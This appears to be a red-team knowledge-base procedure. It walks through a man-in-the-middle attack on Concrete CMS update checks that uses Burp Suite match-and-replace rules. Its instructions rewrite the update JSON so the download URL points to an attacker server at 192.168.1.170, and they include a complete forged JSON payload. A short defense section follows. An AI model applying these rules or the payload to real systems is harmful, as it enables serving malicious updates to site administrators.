---
id: proc-concrete-json-tamper-001
tags:
  - json-tampering
  - mitm
  - concrete-cms
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Adversary-in-the-Middle]]'
updated_at: '2025-12-14T17:23:24.116Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Adversary-in-the-Middle]]'
---
# Tamper-with-Update-JSON-via-Proxy-Rules

## Summary

This procedure uses proxy rules in Burp Suite to intercept and modify the HTTP response for the Concrete CMS update JSON, altering the download URL to point to a malicious ZIP and updating version fields to trigger the update process.

## Description

The vulnerability stems from HTTP usage for fetching update schema from www.concrete5.org. With the proxy configured, requests are intercepted: the request version is downgraded (e.g., 8.5.4 to 8) for a valid response, and the response's direct_download_url is changed to the attacker's server, with version set to 8.6. This crafts a fake update notification leading to malicious download. Target: Concrete CMS admin update check; prerequisites: proxy active and Burp running.

## Requirements

1. Burp Suite with Proxy tab active on 127.0.0.1:8080
2. Knowledge of current CMS version (e.g., 8.5.4)
3. Attacker server URL ready (e.g., http://192.168.1.170:8000/test.zip)

## Defense

Defensive measures and detection strategies:

- Switch to HTTPS for update fetches
- Validate JSON signatures or use pinned certificates
- Log and alert on proxy configurations and unusual update attempts

## Objectives

1. Modify JSON to inject malicious download URL
2. Bypass version checks for update trigger
3. Enable ZIP download in the attack chain

## Instructions

### Step 1: Set Request Replacement Rule

**Context**: Alter the version in the outgoing request to retrieve a valid JSON.

In Burp Suite > Proxy > Options > Match and Replace, add rule: Type=Request Header, Match=8.5.4, Replace=8 (for path or body containing version).

> Expected output: Intercepted request modified before forwarding to concrete5.org.

### Step 2: Set Response Replacement Rules

**Context**: Tamper with the JSON response to redirect download and fake version.

Add rules: (1) Match=\"direct_download_url\":\".*\", Replace=\"direct_download_url\":\"http://192.168.1.170:8000/test.zip\" (JSON escaped); (2) Match=\"version\":\".*\", Replace=\"version\":\"8.6\".

> Alternatively, drop and inject full JSON: {"version":"8.6","notes":"RCE","notes_url":"https:\/\/documentation.concrete5.org\/developers\/background\/version-history\/821-release-notes","identifier":"8.6","date":"2017-08-02","direct_download_url":"http:\/\/192.168.1.170:8000\/test.zip"}. Expected output: CMS receives tampered JSON showing update available.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Adversary-in-the-Middle]] Adversary-in-the-Middle

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- json-tampering
- mitm
- concrete-cms
